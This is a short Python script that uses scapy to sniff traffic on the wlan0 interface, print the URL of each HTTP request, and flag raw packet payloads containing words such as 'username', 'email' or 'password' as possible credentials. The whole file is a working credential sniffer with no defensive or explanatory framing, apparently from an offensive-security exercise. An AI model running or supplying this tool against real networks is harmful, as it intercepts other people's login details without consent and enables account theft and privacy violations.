#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
from scapy.layers.tls.handshake import TLSClientHello


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode(errors="ignore")
    path = packet[http.HTTPRequest].Path.decode(errors="ignore")
    return host + path
    # return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load

            try:
                load = load.decode(errors="ignore")
            except:
                return
            
            keywords = ["username", "uname", "user", "login", "email", "password", "pass"]
            for keyword in keywords:
                if keyword in load.lower():
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")



sniff("wlan0")